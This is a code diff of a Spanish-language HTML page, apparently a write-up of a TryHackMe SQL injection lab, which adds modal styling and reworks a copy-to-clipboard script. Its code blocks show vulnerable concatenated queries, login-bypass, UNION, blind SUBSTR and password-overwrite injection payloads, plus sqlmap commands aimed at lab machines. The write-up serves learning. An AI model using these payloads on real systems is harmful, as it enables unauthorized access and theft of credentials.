@@ -62,7 +62,154 @@
         });
     </script>
 </head>
+  <style>
+    /* Estilos para el modal */
+  .modal {
+      display: flex;
+      position: fixed;
+      z-index: 1;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0, 0, 0, 0.8);
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      display: flex; /* Usamos flexbox para centrar el contenido */
+      align-items: center; /* Centra verticalmente */
+      justify-content: center; /* Centra horizontalmente */
+    }
+    
+    /* Clase que muestra el modal */
+    .modal.show {
+      opacity: 1;
+    }
+    
+    /* Estilos para el contenido del modal */
+    .modal-content {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 100%;
+      max-width: 1000px; /* Limita el ancho máximo para el contenido del modal */
+      max-height: 80vh; /* Limita la altura máxima para evitar que el modal sea demasiado alto */
+      background: #cccccc63;
+      border-radius: 8px;
+      animation: zoomIn 0.3s ease forwards; /* Animación con el estado final */
+      padding: 5px;
+    }
+    /* Animación para el zoom-in del contenido del modal */
+    @keyframes zoomIn {
+      from {
+        opacity: 0;
+        transform: translate(-50%, -50%) scale(0.8); /* Comienza escalado desde el centro */
+      }
+      to {
+        opacity: 1;
+        transform: translate(-50%, -50%) scale(1); /* Termina en el tamaño final desde el centro */
+      }
+    
+    }
+    
+    /* Estilos para el botón de cerrar */
+    .close {
+      position: absolute;
+      top: 0%;
+      right: 0%;
+      left: -70%;
+      color: #ccc;
+      font-size: 40px;
+      font-weight: bold;
+      transition: color 0.3s ease;
+      cursor: pointer;
+    }
+    
+    .close:hover,
+    .close:focus {
+      color: #bbb;
+      text-decoration: none;
+    }
+    
+    /* Estilos responsivos para pantallas pequeñas */
+    @media only screen and (max-width: 700px) {
+      .modal-content {
+        position: absolute;
+        top: 50%;
+        left: 45%;
+        right: 45%;
+        width: 100%;
+        max-width: 1000px; /* Limita el ancho máximo para el contenido del modal */
+        max-height: 80vh; /* Limita la altura máxima para evitar que el modal sea demasiado alto */
+        background: #cccccc63;
+        border-radius: 8px;
+        animation: zoomIn 0.3s ease forwards; /* Animación con el estado final */
+        padding: 5px;
+      }
+    
+      .close {
+        top: 25%;
+        right: 45%;
+        left: 45%;
+        font-size: 35px; /* Reduce el tamaño del botón de cerrar en pantallas pequeñas */
+      }
+    }
+    
+     /* Estilo para el contenedor principal */
+     .code-container {
+          display: inline-block;
+          text-align: left;
+          margin-top: 20px;
+          border: 1px solid #ddd;
+          border-radius: 8px;
+          width: 100%;
+          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+          overflow: hidden;
+        }
+    
+        /* Estilo para el encabezado del código */
+        .code-header {
+          background-color: #2d2d2d;
+          color: #ffffff;
+          padding: 10px 15px;
+          font-size: 14px;
+          font-weight: bold;
+          border-bottom: 1px solid #ddd;
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+        }
+    
+        /* Estilo para el bloque de código*/ 
+        pre {
+          text-align: center;
+          padding: 15px;
+          background-color: #f5f2f0;
+          color: #f5f2f0;
+          border-radius: 0 0 8px 8px;
+          font-size: 14px;
+          overflow-x: auto;
+          word-wrap: break-word; /* Asegura que las líneas largas se ajusten*/
+        }
+    
+        /* Estilos para el botón de copiar */
+        .copy-button {
+          background-color: #ffffff;
+          color: rgb(0, 0, 0);
+          padding: 5px 10px;
+          border: none;
+          border-radius: 4px;
+          cursor: pointer;
+          font-size: 14px;
+        }
+    
+        .copy-button:hover {
+          background-color: #8f8f8f;
+        }
+  </style>
 </head>
+
+
 
 <body>
   <nav class="navbar is-black is-fixed-top is-rounded" role="navigation" aria-label="main navigation" id="navbar">
@@ -204,7 +351,7 @@
  <div class="code-container">
     <div class="code-header">
       PHP
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="php">Copiar</button>
     </div>
     <pre><code class="language-php">$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"</code></pre>
   </div>
@@ -218,7 +365,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT * FROM users WHERE username='' OR 1=1 -- AND password=''</code></pre>
   </div>
@@ -235,7 +382,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM users
     WHERE profileID = 10 AND password 'ce44iqns...'</code></pre>
@@ -250,7 +397,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM users 
     WHERE profileID ='10' AND password 'ce44iqns...'</code></pre>
@@ -268,7 +415,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM users 
 		WHERE profileID ='10' AND password 'ce44iqns...'</code></pre>
@@ -281,7 +428,7 @@
  <div class="code-container">
     <div class="code-header">
       JavaScript
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-js">functionvalidateform() {
   var profileID = document.inputForm.profileID.value;
@@ -350,7 +497,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-SQL"># MySQL and MSSQL*
   ',nickName=@@version,email='
@@ -373,7 +520,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='</code></pre>
   </div>
@@ -391,7 +538,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name = 'usertable'),email='</code></pre>
   </div>
@@ -411,7 +558,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">',nickname = (SELECT group_concat(profileID || "," || name || "," ||password || ":") FROM usertable), email='</code></pre>
   </div>
@@ -429,7 +576,7 @@
 <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">', password='&lt;contraseña_hasheada&gt;' WHERE name='Admin'-- -</code></pre>
   </div>
@@ -472,7 +619,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT id, username FROM users WHERE username='" + username + "' AND password= '" + password + "'</code></pre>
   </div>
@@ -483,7 +630,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">1' UNION SELECT NULL -- -</code></pre>
   </div>
@@ -507,7 +654,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">' UNION SELECT 1, password FROM users-- -</code></pre>
   </div>
@@ -519,7 +666,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">' UNION SELECT 1, group_concat(password) FROM users-- -</code></pre>
   </div>
@@ -547,7 +694,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SUBSTR(string, &lt;start&gt;, &lt;length&gt;)</code></pre>
   </div>
@@ -561,7 +708,7 @@
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">-- Changing start --
 SUBSTR("THM{Blind}", 1,1) = T
@@ -580,7 +727,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">(SELECT password FROM users LIMIT 0,1)</code></pre>
   </div>
@@ -593,7 +740,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SUBSTR((SELECT password FROM users LIMIT 0,1)1,1)</code></pre>
   </div>
@@ -604,7 +751,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'</code></pre>
   </div>
@@ -616,7 +763,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)</code></pre>
   </div>
@@ -628,7 +775,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -</code></pre>
   </div>
@@ -639,7 +786,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT id, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)</code></pre>
   </div>
@@ -654,7 +801,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       Bash
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-bash">sqlmap -u http://MACHINE_IP:5000/challenge3/login --data="username=admin&amp;password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dumpy</code></pre>
   </div>
@@ -680,7 +827,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">INSERT INTO notes (username, title, note) VALUES (?,?,?)</code></pre>
   </div>
@@ -696,7 +843,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT title, note FROM notes WHERE name = '" + nombre de usuario + "'</code></pre>
   </div>
@@ -714,7 +861,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT title, note FROM notes WHERE name='" UNION SELECT 1,2"'</code></pre>
   </div>
@@ -728,7 +875,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">'UNION SELECT 1,group_concat(tlb_name) FROM sqllite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%''</code></pre>
   </div>
@@ -750,7 +897,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       Bash
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-bash">sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&amp;password=asd"</code></pre>
   </div>
@@ -772,7 +919,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">UPDATE users SET password = ? WHERE username = '" + username + "'</code></pre>
   </div>
@@ -786,7 +933,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT username, password FROM users WHERE id = ?</code></pre>
   </div>
@@ -798,7 +945,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">UPDATE users SET password = ? WHERE username = 'admin' -- -'</code></pre>
   </div>
@@ -820,7 +967,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '"+ title + "%')</code></pre>
   </div>
@@ -850,7 +997,7 @@ SUBSTR("THM{Blind}", 1,3) = THM
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)
 if bid:
@@ -885,7 +1032,7 @@ if bid:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">test' UNION SELECT '1'-- -</code></pre>
   </div>
@@ -907,7 +1054,7 @@ if bid:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT * FROM book WHERE id = ' ' UNION SELECT 1,2,3,4-- -</code></pre>
   </div>
@@ -919,7 +1066,7 @@ if bid:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">SELECT * FROM book WHERE id = ' ' UNION SELECT '-1' UNION SELECT 1,2,3,4- -</code></pre>
   </div>
@@ -937,7 +1084,7 @@ if bid:
  <div class="code-container">
     <div class="code-header">
       SQL
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+      <button class="copy-button" data-code="sql">Copiar</button>
     </div>
     <pre><code class="language-sql">' union select '-1''union select 1,group_concat(username),group_concat(password),2 from users-- -</code></pre>
   </div>
@@ -1024,22 +1171,42 @@ if bid:
     <img class="modal-content" id="img01">
   </div>
  <!-- Prism.js Script -->
-
   <script src="../prism.js"></script>
   <script>
-    function copyToClipboard(button) {
-    const codeBlock = button.closest('.code-container').querySelector('code');
-    navigator.clipboard.writeText(codeBlock.textContent).then(() => {
-        button.textContent = 'Copiado';
+    function copyToClipboard(event) {
+    // Obtén el botón que fue clickeado
+    const button = event.target;
+
+    // Encuentra el bloque de código asociado al botón
+    const codeContainer = button.closest('.code-container');
+    const codeElement = codeContainer.querySelector('code');
+    
+    if (!codeElement) {
+        console.error('No se encontró el elemento <code> para copiar.');
+        return;
+    }
+
+    const code = codeElement.textContent;
+
+    // Usa la API moderna de Clipboard para copiar el texto
+    navigator.clipboard.writeText(code).then(() => {
+        // Cambia el texto del botón a 'Copiado'
+        button.textContent = 'Copiado!';
+
+        // Opcional: Restaura el texto del botón después de un breve período
         setTimeout(() => {
             button.textContent = 'Copiar';
-        }, 2000);
+        }, 2000); // 2000 ms = 2 segundos
+
     }).catch(err => {
-        console.error('Error al copiar el texto: ', err);
+        // Maneja errores (opcional)
+        console.error('Error al copiar al portapapeles: ', err);
     });
 }
-
-     function openModal(imgSrc) {
+        document.querySelectorAll('.copy-button').forEach(button => {
+          button.addEventListener('click', copyToClipboard);
+        });
+      function openModal(imgSrc) {
       var modal = document.getElementById("myModal");
       var modalImg = document.getElementById("img01");
 
